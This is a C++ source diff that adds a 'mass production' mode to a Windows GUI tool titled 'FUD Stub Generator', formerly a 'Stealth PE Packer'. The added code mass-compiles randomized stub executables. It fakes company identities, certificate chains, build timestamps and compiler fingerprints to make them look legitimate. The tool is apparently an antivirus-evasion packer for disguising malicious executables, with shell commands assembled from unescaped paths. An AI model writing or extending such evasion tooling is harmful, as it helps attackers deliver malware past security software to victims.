@@ -1020,6 +1020,107 @@ public:
             {MultiArchitectureSupport::Architecture::AnyCPU, multiArch.getArchitectureName(MultiArchitectureSupport::Architecture::AnyCPU)}
         };
     }
+
+    // NEW: Create a benign stub only (no PE embedding)
+    bool createBenignStubOnly(const std::string& inputPath, const std::string& outputPath, 
+                               int companyIndex, int certIndex, 
+                               MultiArchitectureSupport::Architecture architecture) {
+        try {
+            // Get company and certificate info
+            const auto& company = companyProfiles[companyIndex % companyProfiles.size()];
+            const auto& cert = certificateChains[certIndex % certificateChains.size()];
+            
+            // Generate super benign code with all enhancements
+            std::string benignCode = benignBehavior.generateBenignCode(company.name);
+            
+            // Apply DNA randomization (this adds junk variables safely)
+            benignCode = dnaRandomizer.randomizeCode(benignCode);
+            
+            // DEBUG: Write generated code to file for inspection
+            std::ofstream debugCodeFile("debug_generated_code.txt");
+            if (debugCodeFile.is_open()) {
+                debugCodeFile << "Generated C++ code:\n" << benignCode << std::endl;
+                debugCodeFile.close();
+            }
+            
+            // Create temporary source file
+            std::string tempSource = "temp_" + randomEngine.generateRandomName() + ".cpp";
+            std::ofstream sourceFile(tempSource);
+            if (!sourceFile.is_open()) {
+                return false;
+            }
+            sourceFile << benignCode;
+            sourceFile.close();
+            
+            // Simple compiler detection - just use system cl.exe
+            auto compilerInfo = CompilerDetector::detectVisualStudio();
+            compilerInfo.path = "cl.exe";
+            compilerInfo.found = true;
+            
+            // Generate realistic timestamp
+            uint32_t timestamp = timestampEngine.generateRealisticTimestamp();
+            
+            // Get compiler fingerprint
+            auto compilerFingerprint = compilerMasq.generateVS2019Fingerprint();
+            
+            // Build compilation command with architecture support
+            std::string archFlags = multiArch.getCompilerFlags(architecture);
+            
+            std::string compileCmd;
+            
+            // Try to use vcvars64.bat if available
+            if (!compilerInfo.vcvarsPath.empty()) {
+                compileCmd = "call \"" + compilerInfo.vcvarsPath + "\" >nul 2>&1 && ";
+            } else {
+                // Use Enterprise vcvars64.bat
+                compileCmd = "call \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat\" >nul 2>&1 && ";
+            }
+            
+            // Build the compilation command
+            if (compilerInfo.path == "cl.exe") {
+                compileCmd += "cl /nologo /O2 /DNDEBUG /MD ";
+            } else {
+                compileCmd += "\"" + compilerInfo.path + "\" /nologo /O2 /DNDEBUG /MD ";
+            }
+            
+            compileCmd += "/Fe\"" + outputPath + "\" ";
+            compileCmd += "\"" + tempSource + "\" ";
+            compileCmd += "/link " + archFlags + " /OPT:REF /OPT:ICF ";
+            compileCmd += "user32.lib kernel32.lib advapi32.lib shell32.lib ole32.lib";
+            
+            // DEBUG: Write compilation command to file for inspection
+            std::ofstream debugFile("debug_compile_cmd.txt");
+            if (debugFile.is_open()) {
+                debugFile << "Compilation command:\n" << compileCmd << std::endl;
+                debugFile.close();
+            }
+            
+            // Execute compilation
+            int result = system(compileCmd.c_str());
+            
+            // DEBUG: Write result to file
+            std::ofstream resultFile("debug_compile_result.txt");
+            if (resultFile.is_open()) {
+                resultFile << "Compilation result: " << result << std::endl;
+                resultFile << "Command was: " << compileCmd << std::endl;
+                resultFile.close();
+            }
+            
+            // Clean up temporary file
+            DeleteFileA(tempSource.c_str());
+            
+            if (result == 0) {
+                // Post-process the executable for additional legitimacy
+                enhanceExecutableLegitimacy(outputPath, company, cert, compilerFingerprint, architecture);
+                return true;
+            }
+            
+            return false;
+            
+        } catch (...) {
+            return false;
+        }
+    }
 };
 
 class EmbeddedCompiler {
@@ -1199,7 +1300,100 @@ private:
 
 // Global variables
 HWND g_hInputPath, g_hOutputPath, g_hProgressBar, g_hStatusText, g_hCompanyCombo, g_hArchCombo, g_hCertCombo;
+HWND g_hMassCountEdit, g_hMassGenerateBtn, g_hStopGenerationBtn;
 UltimateStealthPacker g_packer;
+
+// Mass generation function
+DWORD WINAPI massGenerationThread(LPVOID lpParam) {
+    int totalCount = *(int*)lpParam;
+    
+    for (int i = 0; i < totalCount && g_massGenerationActive; ++i) {
+        // Randomize company, cert, and architecture for each generation
+        int companyIndex = g_packer.randomEngine.generateRandomDWORD() % g_packer.getCompanyProfiles().size();
+        int certIndex = g_packer.randomEngine.generateRandomDWORD() % g_packer.getCertificateChains().size();
+        int archIndex = g_packer.randomEngine.generateRandomDWORD() % 3; // x86, x64, AnyCPU
+        
+        auto architectures = g_packer.getArchitectures();
+        MultiArchitectureSupport::Architecture architecture = architectures[archIndex].first;
+        
+        // Generate unique output filename
+        std::string outputPath = "FUD_Stub_" + std::to_string(i + 1) + "_" + 
+                                g_packer.randomEngine.generateRandomName(8) + ".exe";
+        
+        // Create a dummy input file (we're only generating benign stubs)
+        std::string dummyInput = "C:\\Windows\\System32\\notepad.exe";
+        
+        // Update status
+        std::wstring statusText = L"Generating FUD stub " + std::to_wstring(i + 1) + 
+                                 L" of " + std::to_wstring(totalCount) + L"...";
+        SetWindowTextW(g_hStatusText, statusText.c_str());
+        
+        // Update progress
+        int progress = (i * 100) / totalCount;
+        SendMessage(g_hProgressBar, PBM_SETPOS, progress, 0);
+        
+        // Generate the FUD stub (benign only, no PE embedding)
+        bool success = g_packer.createBenignStubOnly(dummyInput, outputPath, companyIndex, certIndex, architecture);
+        
+        if (!success) {
+            SetWindowTextW(g_hStatusText, L"Generation failed! Check compiler setup.");
+            break;
+        }
+        
+        // Small delay to prevent system overload
+        Sleep(100);
+    }
+    
+    // Generation complete
+    SendMessage(g_hProgressBar, PBM_SETPOS, 100, 0);
+    SetWindowTextW(g_hStatusText, L"Mass generation completed! All FUD stubs created.");
+    
+    // Re-enable buttons
+    EnableWindow(g_hMassGenerateBtn, TRUE);
+    EnableWindow(g_hStopGenerationBtn, FALSE);
+    
+    g_massGenerationActive = false;
+    return 0;
+}
+
+void startMassGeneration() {
+    if (g_massGenerationActive) return;
+    
+    // Get count from edit box
+    wchar_t countBuffer[10];
+    GetWindowTextW(g_hMassCountEdit, countBuffer, 10);
+    int count = _wtoi(countBuffer);
+    
+    if (count <= 0 || count > 10000) {
+        MessageBoxW(NULL, L"Please enter a valid count (1-10000)", L"Invalid Count", MB_OK | MB_ICONWARNING);
+        return;
+    }
+    
+    g_massGenerationActive = true;
+    
+    // Disable/enable buttons
+    EnableWindow(g_hMassGenerateBtn, FALSE);
+    EnableWindow(g_hStopGenerationBtn, TRUE);
+    
+    // Start generation thread
+    static int threadCount = count;
+    g_massGenerationThread = CreateThread(NULL, 0, massGenerationThread, &threadCount, 0, NULL);
+}
+
+void stopMassGeneration() {
+    g_massGenerationActive = false;
+    
+    if (g_massGenerationThread) {
+        WaitForSingleObject(g_massGenerationThread, 2000);
+        CloseHandle(g_massGenerationThread);
+        g_massGenerationThread = NULL;
+    }
+    
+    EnableWindow(g_hMassGenerateBtn, TRUE);
+    EnableWindow(g_hStopGenerationBtn, FALSE);
+    SetWindowTextW(g_hStatusText, L"Mass generation stopped.");
+    SendMessage(g_hProgressBar, PBM_SETPOS, 0, 0);
+}
 
 std::string wstringToString(const std::wstring& wstr) {
     if (wstr.empty()) return std::string();
@@ -1363,6 +1557,19 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                                         WS_VISIBLE | WS_CHILD,
                                         10, 270, 470, 20, hwnd, (HMENU)ID_STATUS_TEXT, NULL, NULL);
             
+            // Mass generation controls
+            CreateWindowW(L"STATIC", L"Mass Generation:", WS_VISIBLE | WS_CHILD,
+                         10, 310, 120, 20, hwnd, NULL, NULL, NULL);
+            
+            g_hMassCountEdit = CreateWindowW(L"EDIT", L"10", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
+                                            140, 307, 50, 25, hwnd, (HMENU)ID_MASS_COUNT_EDIT, NULL, NULL);
+            
+            g_hMassGenerateBtn = CreateWindowW(L"BUTTON", L"Start Mass Generation", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                                              200, 307, 100, 25, hwnd, (HMENU)ID_MASS_GENERATE_BUTTON, NULL, NULL);
+            
+            g_hStopGenerationBtn = CreateWindowW(L"BUTTON", L"Stop Generation", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                                                310, 307, 100, 25, hwnd, (HMENU)ID_STOP_GENERATION_BUTTON, NULL, NULL);
+            
             // Enable drag and drop
             DragAcceptFiles(hwnd, TRUE);
             break;
@@ -1424,6 +1631,16 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                               MB_OK | MB_ICONINFORMATION);
                     break;
                 }
+
+                case ID_MASS_GENERATE_BUTTON: {
+                    startMassGeneration();
+                    break;
+                }
+
+                case ID_STOP_GENERATION_BUTTON: {
+                    stopMassGeneration();
+                    break;
+                }
             }
             break;
         }
@@ -1465,9 +1682,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     HWND hwnd = CreateWindowExW(
         0,
         CLASS_NAME,
-        L"Ultimate VS2022 Stealth PE Packer v2.0 - ALL 8 Features",
+        L"Ultimate VS2022 FUD Stub Generator v2.1 - Mass Production Mode",
         WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME,
-        CW_USEDEFAULT, CW_USEDEFAULT, 520, 350,
+        CW_USEDEFAULT, CW_USEDEFAULT, 520, 400,
         NULL, NULL, hInstance, NULL
     );
     
